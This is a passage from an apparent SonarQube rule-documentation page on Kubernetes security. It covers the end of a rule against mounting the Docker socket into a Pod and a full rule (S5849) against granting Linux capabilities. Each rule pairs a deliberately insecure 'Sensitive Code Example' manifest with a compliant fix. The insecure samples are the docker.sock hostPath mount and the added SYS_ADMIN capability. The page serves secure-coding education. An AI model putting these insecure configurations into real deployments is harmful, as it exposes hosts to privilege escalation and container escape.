<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to never add a Docker socket as a volume to a Pod.</p>
<h2>Sensitive Code Example</h2>
<pre>
apiVersion: v1
kind: Pod
metadata:
  name: test
spec:
  containers:
  - image: k8s.gcr.io/test-webserver
    name: test-container
    volumeMounts:
    - mountPath: /var/run/docker.sock
      name: test-volume
  volumes:
  - name: test-volume
    hostPath:
      path: /var/run/docker.sock # Sensitive
      type: Socket
</pre>
<h2>Compliant Solution</h2>
<pre>
apiVersion: v1
kind: Pod
metadata:
  name: test
spec:
  containers:
  - image: k8s.gcr.io/test-webserver
    name: test-container
</pre>
<h2>See</h2>
<ul><li> <a href="https://kubernetes.io/docs/concepts/storage/volumes/#hostpath" rel="nofollow">Kubernetes Documentation</a> - Volumes </li><li> <a href="https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option" rel="nofollow">Docker Documention</a> - Daemon socket option
  </li><li> <a href="https://cwe.mitre.org/data/definitions/284.html" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=kubernetes:S5849">
              kubernetes:S5849
            </a>
          </td>
          <td>
            <details>
              <p>Setting capabilities can lead to privilege escalation and container escapes.</p>
<p>Linux capabilities allow you to assign narrow slices of <code>root</code>&#39;s permissions to processes. A thread with capabilities bypasses the
normal kernel security checks to execute high-privilege actions such as mounting a device to a directory, without requiring additional root
privileges.</p>
<p>In a container, capabilities might allow to access resources from the host system which can result in container escapes. For example, with the
capability <code>SYS_ADMIN</code> an attacker might be able to mount devices from the host system inside of the container.</p>
<h2>Ask Yourself Whether</h2>
<p>Capabilities are granted:</p>
<ul><li> To a process that does not require all capabilities to do its job. </li><li> To a not trusted process. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Capabilities are high privileges, traditionally associated with superuser (root), thus make sure that the most restrictive and necessary
capabilities are assigned.</p>
<h2>Sensitive Code Example</h2>
<pre>
apiVersion: v1
kind: Pod
metadata:
  name: example
spec:
  containers:
  - image: k8s.gcr.io/test-webserver
    name: test-container
    securityContext:
      capabilities:
        add: [&#34;SYS_ADMIN&#34;] # Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
apiVersion: v1
kind: Pod
metadata:
  name: example
spec:
  containers:
  - image: k8s.gcr.io/test-webserver
    name: test-container
</pre>
<h2>See</h2>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/250" rel="nofollow">MITRE, CWE-250</a> - Execution with Unnecessary Privileges </li><li> <a href="https://cwe.mitre.org/data/definitions/266" rel="nofollow">MITRE, CWE-266</a> - Incorrect Privilege Assignment </li><li> <a href="https://kubernetes.io/docs/tasks/configure-pod-container/security-context/" rel="nofollow">Kubernetes Documentation</a> - Configure a Security
  Context for a Pod or Container </li><li> <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html" rel="nofollow">Linux manual page</a> - capabilities(7) </li></ul>
            </details>
          </td>
        </tr>
        
      </tbody>
    </table>
    
  </div>

  
</body>

</html>